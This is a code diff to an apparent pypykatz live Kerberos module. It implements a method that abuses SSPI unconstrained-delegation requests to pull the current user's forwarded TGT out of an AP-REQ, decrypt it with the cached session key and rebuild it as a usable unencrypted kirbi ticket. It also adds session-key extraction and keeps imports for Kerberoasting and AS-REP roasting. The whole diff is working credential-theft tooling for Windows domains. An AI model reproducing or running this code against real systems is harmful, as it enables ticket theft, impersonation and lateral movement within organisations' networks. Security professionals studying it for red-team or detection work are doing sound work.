@@ -1,30 +1,24 @@
 
 import datetime
+
+from winacl.functions.highlevel import get_logon_info
 from msldap.commons.url import MSLDAPURLDecoder
 from winsspi.sspi import KerberoastSSPI
+from winsspi.common.gssapi.asn1_structs  import InitialContextToken
 from minikerberos.common.utils import TGSTicket2hashcat, TGTTicket2hashcat
-from minikerberos.security import APREPRoast
 from minikerberos.network.clientsocket import KerberosClientSocket
 from minikerberos.common.target import KerberosTarget
-from winsspi.sspi import KerberoastSSPI, SSPI, SSPIModule, SSPIResult
-from winsspi.common.gssapi.asn1_structs  import InitialContextToken
-from winacl.functions.highlevel import get_logon_info
 
-
-from minikerberos.security import KerberosUserEnum, APREPRoast, Kerberoast
-from msldap.authentication.kerberos.gssapi import get_gssapi, GSSWrapToken, KRB5_MECH_INDEP_TOKEN
-from minikerberos.common.url import KerberosClientURL, kerberos_url_help_epilog
-from minikerberos.common.spn import KerberosSPN
+from minikerberos.security import APREPRoast, Kerberoast
 from minikerberos.common.creds import KerberosCredential
 from minikerberos.common.target import KerberosTarget
-from minikerberos.common.keytab import Keytab
-from minikerberos.aioclient import AIOKerberosClient
 from minikerberos.common.utils import TGSTicket2hashcat
-from minikerberos.protocol.asn1_structs import AP_REQ, TGS_REQ, KRB_CRED
+from minikerberos.protocol.asn1_structs import AP_REQ, KRB_CRED, EncKrbCredPart, \
+	KRBCRED, Authenticator, KrbCredInfo, EncryptedData, TGS_REQ, AP_REP
 from minikerberos.common.utils import print_table
 from minikerberos.common.ccache import CCACHE, Credential
-from minikerberos.protocol.asn1_structs import KRBCRED, TGS_REP, Authenticator
 from minikerberos.protocol.structures import ChecksumFlags, AuthenticatorChecksum
+from minikerberos.protocol.encryption import Key, _enctype_table
 
 
 from pypykatz import logger
@@ -34,12 +28,12 @@ from pypykatz.kerberos.functiondefs.netsecapi import LsaConnectUntrusted, \
 	LsaDeregisterLogonProcess, LsaRegisterLogonProcess, LsaEnumerateLogonSessions, \
 	LsaGetLogonSessionData, LsaFreeReturnBuffer, retrieve_tkt_helper, KERB_RETRIEVE_TKT_RESPONSE, \
 	get_lsa_error, get_ticket_cache_info_helper, extract_ticket, submit_tkt_helper, \
-	AcquireCredentialsHandle, InitializeSecurityContext, SECPKG_CRED, ISC_REQ, SEC_E
+	AcquireCredentialsHandle, InitializeSecurityContext, SECPKG_CRED, ISC_REQ, SEC_E, \
+	SecPkgContext_SessionKey, QueryContextAttributes, SECPKG_ATTR
 
 from pypykatz.kerberos.functiondefs.advapi32 import OpenProcessToken,  GetTokenInformation_tokenstatistics
 from pypykatz.kerberos.functiondefs.kernel32 import GetCurrentProcessId, OpenProcess, CloseHandle, MAXIMUM_ALLOWED
 
-from minikerberos.protocol.encryption import Key, _enctype_table
 
 class KerberosLive:
 	def __init__(self, start_luid = 0):
@@ -215,49 +209,75 @@ class KerberosLive:
 		if len(ret_msg) > 0:
 			LsaFreeReturnBuffer(free_ptr)
 
-def get_tgt():
-	pass
+	def get_tgt(self, target = None):
+		if target is None:
+			logon = get_logon_info()
+			if logon['logonserver'] is None:
+				raise Exception('Failed to get logonserver and no target was specified! This wont work.')
+			target = 'cifs/%s' % logon['logonserver']
 
-def get_tgs(target):
-	#target = ''
-	ctx = AcquireCredentialsHandle(None, 'kerberos', target, SECPKG_CRED.OUTBOUND)
-	res, ctx, data, outputflags, expiry = InitializeSecurityContext(
-		ctx, 
-		target, 
-		token = None, 
-		ctx = ctx, 
-		flags = ISC_REQ.DELEGATE | ISC_REQ.MUTUAL_AUTH | ISC_REQ.ALLOCATE_MEMORY
-	)
-	
-	
-	if res == SEC_E.OK or res == SEC_E.CONTINUE_NEEDED:
-		#key_data = sspi._get_session_key()
-		kl = KerberosLive()
-		raw_ticket = kl.export_ticketdata_target(0, target)
-		key = Key(raw_ticket['Key']['KeyType'], raw_ticket['Key']['Key'])
-		import pprint
-		token = InitialContextToken.load(data[0][1])
-		#print(token)
-		ticket = AP_REQ(token.native['innerContextToken']).native
-		#pprint.pprint(ticket)
-		cipher = _enctype_table[ticket['authenticator']['etype']]
-		dec_authenticator = cipher.decrypt(key, 11, ticket['authenticator']['cipher'])
-		authenticator = Authenticator.load(dec_authenticator).native
-		if authenticator['cksum']['cksumtype'] != 0x8003:
-			raise Exception('Checksum not good :(')
+		ctx = AcquireCredentialsHandle(None, 'kerberos', target, SECPKG_CRED.OUTBOUND)
+		res, ctx, data, outputflags, expiry = InitializeSecurityContext(
+			ctx, 
+			target, 
+			token = None, 
+			ctx = ctx, 
+			flags = ISC_REQ.DELEGATE | ISC_REQ.MUTUAL_AUTH | ISC_REQ.ALLOCATE_MEMORY
+		)
 		
-		#print(authenticator)
-		checksum_data = AuthenticatorChecksum.from_bytes(authenticator['cksum']['checksum'])
-		if ChecksumFlags.GSS_C_DELEG_FLAG not in checksum_data.flags:
-			raise Exception('delegation flag not set!')
+		
+		if res == SEC_E.OK or res == SEC_E.CONTINUE_NEEDED:
+			#key_data = sspi._get_session_key()
+			raw_ticket = self.export_ticketdata_target(0, target)
+			key = Key(raw_ticket['Key']['KeyType'], raw_ticket['Key']['Key'])
+			token = InitialContextToken.load(data[0][1])
+			ticket = AP_REQ(token.native['innerContextToken']).native
+			cipher = _enctype_table[ticket['authenticator']['etype']]
+			dec_authenticator = cipher.decrypt(key, 11, ticket['authenticator']['cipher'])
+			authenticator = Authenticator.load(dec_authenticator).native
+			if authenticator['cksum']['cksumtype'] != 0x8003:
+				raise Exception('Checksum not good :(')
+			
+			checksum_data = AuthenticatorChecksum.from_bytes(authenticator['cksum']['checksum'])
+			if ChecksumFlags.GSS_C_DELEG_FLAG not in checksum_data.flags:
+				raise Exception('delegation flag not set!')
 
-		#print(checksum_data.delegation_data)
-		cred = KRB_CRED.load(checksum_data.delegation_data)
-		#print(cred.native)
-		pprint.pprint(cred.native)
-		#pprint.pprint(ticket['authenticator'])
-		
-	
+			cred_orig = KRB_CRED.load(checksum_data.delegation_data).native
+			dec_authenticator = cipher.decrypt(key, 14, cred_orig['enc-part']['cipher'])
+			#info = EncKrbCredPart.load(dec_authenticator).native
+
+			#reconstructing kirbi with the unencrypted data
+			te = {}
+			te['etype'] = 0
+			te['cipher'] = dec_authenticator
+			ten = EncryptedData(te)
+
+			t = {}
+			t['pvno'] = cred_orig['pvno']
+			t['msg-type'] = cred_orig['msg-type']
+			t['tickets'] = cred_orig['tickets']
+			t['enc-part'] = ten
+
+			cred = KRB_CRED(t)
+			return cred.dump()
+
+	def get_apreq(self, target):
+		ctx = AcquireCredentialsHandle(None, 'kerberos', target, SECPKG_CRED.OUTBOUND)
+		res, ctx, data, outputflags, expiry = InitializeSecurityContext(
+			ctx,
+			target,
+			token = None,
+			ctx = ctx,
+			flags = ISC_REQ.ALLOCATE_MEMORY | ISC_REQ.CONNECTION
+		)
+		if res == SEC_E.OK or res == SEC_E.CONTINUE_NEEDED:
+			sec_struct = SecPkgContext_SessionKey()
+			QueryContextAttributes(ctx, SECPKG_ATTR.SESSION_KEY, sec_struct)
+			key_data = sec_struct.Buffer
+			#print(data[0][1].hex())
+			
+			ticket = InitialContextToken.load(data[0][1]).native['innerContextToken']
+			return AP_REQ(ticket), key_data
 
 
 async def live_roast(outfile = None):
